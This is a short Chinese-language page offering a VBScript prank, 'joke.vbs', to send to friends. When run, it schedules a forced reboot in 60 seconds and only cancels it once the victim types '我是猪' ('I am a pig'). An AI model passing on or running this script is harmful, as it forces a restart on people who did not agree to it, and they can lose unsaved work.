# VBS整人脚本

使用方法： 将下面的代码保存为joke.vbs，并发送给你的朋友吧！

```vb
on error resume next      
dim WSHshellA      
set WSHshellA = wscript.createobject("wscript.shell")      
WSHshellA.run "cmd.exe /c shutdown -r -t 60 -c ""说我是猪，不然就1分钟内关你机"" ",0 ,true      
dim a      
do while(a <> "我是猪")      
a = inputbox ("说我是猪,就不关机，快，说 ""我是猪"" ","说不说","不说",8000,7000)      
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox"      
loop      
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛"      
dim WSHshell      
set WSHshell = wscript.createobject("wscript.shell")      
WSHshell.run "cmd.exe /c shutdown -a",0 ,true      
msgbox chr(13) + chr(13) + chr(13) + "你也承认你是猪了-_-!"?
```


